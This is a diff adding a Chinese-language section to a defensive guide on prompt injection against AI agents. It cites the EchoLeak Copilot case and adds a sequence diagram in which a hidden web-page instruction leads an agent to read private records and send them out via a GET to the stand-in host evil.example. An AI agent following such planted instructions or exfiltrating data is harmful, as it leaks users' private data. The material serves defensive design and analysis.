@@ -71,6 +71,41 @@
 
 **[EchoLeak / CVE-2025-32711](https://sentra.io/blog/copilot-echoleak-prompt-injection)（2025-06，Microsoft 365 Copilot，CVSS 9.3）是教科书实例**：攻击者只需发一封普通邮件，Copilot 例行摘要时执行其中隐藏指令，从 OneDrive/SharePoint/Teams 取数据，再经**受信任的 Microsoft 域**外泄。零点击（zero-click），用户全程无感。三要素齐活。
 
+**上面的流程图是静态判据；把 EchoLeak 这类攻击摊到时间轴上你会看到另一件事 —— 三要素不是"同时具备"的，是被三次相互独立、单看都合法的工具调用一步步凑齐的。攻击者只写了第 1 步，剩下的全是 Agent 自己完成的：**
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant AT as Attacker
+    participant W as WebPage
+    participant U as User
+    participant AG as Agent
+    participant DB as PrivateDB
+    participant EX as AttackerServer
+
+    AT->>W: plant hidden instruction in a public page
+    Note over AT,W: Payload sits dormant. The agent has not touched it yet
+
+    U->>AG: summarize this page for me
+    AG->>W: fetch page content
+    W-->>AG: article text plus hidden instruction
+    Note over W,AG: Trifecta B satisfied. Untrusted content is now in context
+    Note over AG: Instruction and data share one token stream. Any detector runs inside this same node
+
+    AG->>DB: read internal records
+    DB-->>AG: sensitive rows
+    Note over AG,DB: Trifecta A satisfied. Private data is now in context
+
+    AG->>EX: GET evil.example/c?d=base64_rows
+    Note over AG,EX: Trifecta C satisfied. Data crosses the trust boundary
+
+    EX-->>AT: exfiltrated data received
+    AG-->>U: here is your summary
+    Note over AG,U: User sees a normal summary. Zero click and no visible error
+```
+
+> 📖 **读图要点**：三条被 Note 标住的边（fetch / read / GET）**任意打掉一条，链就断了**，这正是上面流程图里①②③的时间轴对应物 —— 而工程上通常最便宜的是拆 [C]：出口只留"回给发起用户"一条通道，第 7 步那支箭头根本无处可发。**注意第 4 步之后那条 Note：模型自身的注入检测不是链上的一条边**，因为检测器和被劫持的推理是同一个节点、同一个 token 流；判断"这段文本是数据还是指令"的，正是已经读进了攻击者文本的那个模型（§4 会给出四条实证）。另一处易被忽略：第 9 步用户拿到的是一份**完全正常的摘要**，攻击全程没有任何失败信号，所以你不能指望用户反馈来发现它，只能靠出口侧的审计。
+
 ---
 
 ## 3. 攻击面全景
